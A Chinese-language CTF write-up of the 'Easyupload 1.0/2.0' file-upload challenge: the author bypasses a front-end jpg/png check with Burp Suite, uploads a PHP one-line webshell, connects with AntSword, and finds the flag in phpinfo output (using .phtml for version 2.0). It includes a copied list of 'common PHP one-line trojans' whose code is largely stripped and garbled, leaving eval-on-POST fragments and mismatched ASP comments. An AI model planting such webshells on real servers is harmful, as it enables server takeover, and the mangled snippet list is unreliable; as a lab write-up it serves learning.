---
title: "Easyupload 1.0 2.0"
published: 2025-09-07
category: CTF
---

本来想把知识点提出来放在别的板块的，算了（懒

打开网址发现是一个文件上传的网站

![](https://pic.npiter.de/file/1757254537432_image.png)

首先想到传个一句话木马上去，但是文件格式要是png或者jpg，这个好办，试试看用bp改一下前端，这个应该是没有前后端校验的

以下知识点搬运自[[SWPUCTF 2021 新生赛]easyupload1.0 - y0Zero - 博客园](https://www.cnblogs.com/bkofyZ/p/17617427.html)

**文件上传漏洞**是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。

 	- 这里放一些常用的PHP一句话木马

```php

 php环境>=  php环境>=5.6才能用

//容错代码
//使用Lanker一句话客户端的专家模式执行相关的PHP语句

/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:O>h=@eval_r($_POST1);

@eval_r($_POST[sb]) //绕过   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！

加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！

无防下载表，有防下载表可尝试插入以下语句突破的一句话

` 备份专用`

```

以``为例，使用bp修改jpg为php，发现上传成功

![](https://i-blog.csdnimg.cn/blog_migrate/5c2501867912dffae71ecaff5d0ead8e.png)

用蚁剑连接发现给的是假的flag，于是想到查看phpInfo()

于是使用``

然后在上传的/upload/a.php界面的environment里面成功找到了flag

![](https://pic.npiter.de/file/1757255120424_image.png)

另 2.0版本

改php发现不行，采用phtml，使用蚁剑连接即可拿到flag
